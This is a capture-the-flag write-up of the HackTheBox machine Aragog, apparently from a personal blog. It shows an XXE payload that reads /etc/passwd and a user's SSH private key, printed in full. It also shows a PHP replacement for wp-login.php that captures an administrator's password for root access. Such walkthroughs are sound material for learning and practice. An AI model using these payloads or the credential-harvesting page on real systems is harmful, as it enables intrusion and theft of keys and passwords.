---
layout: post
title: HackTheBox - Aragog Writeup
tags: [hackthebox]
---

I liked Aragog simple because it had me do a few new things for initial access and root. Overall not super difficult but still fun.

## Enumeration

Quick nmap scan to start things off.

```
root@kali:~/htb/aragog# nmap -sV 10.10.10.78

Starting Nmap 7.50 ( https://nmap.org ) at 2018-02-14 13:00 EST
Nmap scan report for 10.10.10.78
Host is up (0.064s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds

```

If we check ftp, we see that we are able to get in with anonymous access. We also have access to a txt file.


```
root@kali:~/htb/aragog# ftp 10.10.10.78
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
Name (10.10.10.78:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21 15:30 test.txt
226 Directory send OK.
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (86 bytes).
226 Transfer complete.
86 bytes received in 0.00 secs (17.8424 kB/s)
```

Inside we see some XML.

```
root@kali:~/htb/aragog# cat test.txt 
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

Can't do much with this right now. If we check the web server, we get a default apache page. Let's fire up `gobuster` and search for txt and php extensions.

```
root@kali:~/htb/aragog# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.78 -x txt,php

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.78/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
[+] Extensions   : .txt,.php
=====================================================
/hosts.php (Status: 200)

```

If we check `hosts.php` we are presented with the following:

![hosts](/img/aragog-hosts.png)

It's odd that the sentence ends midway through. From looking at our txt file we found earlier we had a parameter about subnets. Subnets and hosts go hand in hand. So maybe we can POST our test file to this and get output for the subnet_mask parameter.

Let's test with `curl`.

```
root@kali:~/htb/aragog# curl -d @test.txt http://10.10.10.78/hosts.php

There are 62 possible hosts for 255.255.255.192
```

We see that we are indeed able to POST XML data to the page and get some output.


## Exploitation

Let's see if we can get an XML External Entity (XXE) attack to work and inject in some XML to get file reads on the system. First we modify our XML file to the following to test if we can read `/etc/passwd`.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

Let's test our payload with `curl`.

```
root@kali:~/htb/aragog# curl -d @test.txt http://10.10.10.78/hosts.php

There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```

Success! We can see here that we have two users, florian and cliff. Let's see if we can get someone's SSH private key.

Let's modify our XML again.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

```
root@kali:~/htb/aragog# curl -d @test.txt http://10.10.10.78/hosts.php

There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

Excellent! Let's put this into a file and try to SSH in.

```
root@kali:~/htb/aragog# vi florian_key
root@kali:~/htb/aragog# chmod 600 florian_key


root@kali:~/htb/aragog# ssh -i florian_key florian@10.10.10.78
The authenticity of host '10.10.10.78 (10.10.10.78)' can't be established.
ECDSA key fingerprint is SHA256:phu0FjQg/9nCmL2014AJ9yH4akvraA7Ea5QtE59wqD4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.78' (ECDSA) to the list of known hosts.
Last login: Sun Feb 18 17:06:44 2018 from 10.10.14.7
florian@aragog:~$
```

## Privilege Escalation

After grabbing the `user.txt` flag we now need to escalate to root. If we look into the web root we see a couple interesting folders.

```
florian@aragog:/var/www/html$ ls -al
total 32
drwxrwxrwx 4 www-data www-data  4096 Feb 19 12:05 .
drwxr-xr-x 3 root     root      4096 Dec 18 16:36 ..
drwxrwxrwx 5 cliff    cliff     4096 Feb 19 12:05 dev_wiki
-rw-r--r-- 1 www-data www-data   689 Dec 21 15:31 hosts.php
-rw-r--r-- 1 www-data www-data 11321 Dec 18 16:36 index.html
drw-r--r-- 5 cliff    cliff     4096 Dec 20 16:17 zz_backup
```

First we see `dev_wiki` which seems to be a hidden WordPress site. We also have `zz_backup` which is a backup of that site. After browsing the hidden site we are presented with the following:

![wiki](/img/aragog-wiki.png)

So Cliff is telling us two things: he's logging in frequently and there's a restore of the site happening as well.

If we look in the webroot we can see that the timestamps on `dev_wiki` and its contents are changing every five minutes. My first thought here was maybe some wildcard injection (see Joker writeup), but after thinking on it, nothing really seemed to be viable even if there were wildcards in the restore script being ran. So it seems that trying to hijack the restore job is probably a dead end.

However we do know that Cliff is logging in frequently. This would mean he's hitting the `wp-login.php` file frequently. What we can do is replace the contents of this file with some PHP code to catch his request and see what login and password he is submitting.

We can do this from some code I found on Stack Overflow.

```
florian@aragog:/var/www/html$ cat dev_wiki/wp-login.php 
<?php
$req_dump = print_r($_REQUEST, TRUE);
$fp = fopen('/tmp/request.log', 'a');
fwrite($fp, $req_dump);
fclose($fp);
?>

```

Now that our page is setup, we wait for our log file to be written. 

```
florian@aragog:/var/www/html$ cat /tmp/request.log 
Array
(
    [pwd] => !KRgYs(JFO!&MTr)lf
    [wp-submit] => Log In
    [testcookie] => 1
    [log] => Administrator
    [redirect_to] => http://127.0.0.1/dev_wiki/wp-admin/
)

```

We can see that we now have Cliff's password!

Let's try to `su` to cliff.

```
florian@aragog:/var/www/html$ su cliff
Password: 
su: Authentication failure
```

Hmm, well let's try to `su` to root

```
florian@aragog:/var/www/html$ su root
Password: 
root@aragog:/var/www/html#
```

Success! `root.txt` is ours!